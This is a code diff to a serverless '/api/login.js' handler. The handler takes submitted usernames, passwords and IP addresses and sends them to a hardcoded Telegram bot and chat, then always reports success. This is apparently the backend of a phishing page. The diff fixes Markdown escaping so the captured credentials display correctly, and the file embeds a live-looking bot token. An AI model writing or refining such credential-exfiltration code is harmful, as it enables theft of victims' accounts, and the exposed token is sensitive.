@@ -1,24 +1,34 @@
-// File: /api/login.js (Final Version with the NEW, CORRECT token)
+// File: /api/login.js (Final Version with Markdown Escape Fix)
 
-// 1. Your NEW, RESET token has been placed here.
-const TELEGRAM_BOT_TOKEN = '8233346929:AAHRpX-fz0n3LOsCLbsCEGGEQFDF7xulTyY';
+const TELEGRAM_BOT_TOKEN = '8233346929:AAHRpX-fz0n3LOsCLbsCEGGEQFDF7xulTyY'; // Your NEW token is correct.
 const TELEGRAM_CHAT_ID = '6402487270'; // Your Chat ID is correct.
+
+// This function will automatically escape any special Markdown characters.
+const escapeMarkdown = (text) => {
+  const toEscape = /[_*[\]()~`>#+-=|{}.!]/g;
+  return text.replace(toEscape, '\\$&');
+};
 
 export default async function handler(req, res) {
   if (req.method === 'POST') {
     const { username, password } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-    // Log the received data on Vercel for confirmation
-    console.log(`Received: User='${username}' Pass='${password}'`);
+    // Escape each variable individually before putting it in the message.
+    const safeUsername = escapeMarkdown(username);
+    const safePassword = escapeMarkdown(password);
+    const safeIp = escapeMarkdown(ip);
+    const safeTimestamp = escapeMarkdown(new Date().toISOString());
 
+    // We no longer need to escape the template itself, only the variables.
     const message = `
-🚨 **NEW LOGIN** 🚨
----------------------------------
-👤 **Username:** \`${username}\`
-🔑 **Password:** \`${password}\`
-💻 **IP Address:** \`${ip}\`
-⏰ **Timestamp:** \`${new Date().toISOString()}\`
+🚨 *NEW LOGIN* 🚨
+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-
+👤 *Username:* \`${safeUsername}\`
+🔑 *Password:* \`${safePassword}\`
+💻 *IP Address:* \`${safeIp}\`
+⏰ *Timestamp:* \`${safeTimestamp}\`
+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-
     `;
 
     const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -30,7 +40,7 @@ export default async function handler(req, res) {
         body: JSON.stringify({
           chat_id: TELEGRAM_CHAT_ID,
           text: message,
-          parse_mode: 'MarkdownV2' // Using Markdown for better formatting
+          parse_mode: 'MarkdownV2'
         } ),
       });
 
@@ -46,7 +56,6 @@ export default async function handler(req, res) {
       console.error('--- FETCH FAILED ---', error);
     }
 
-    // Respond to the frontend
     res.status(200).json({ success: true });
   } else {
     res.status(405).send('Method Not Allowed');
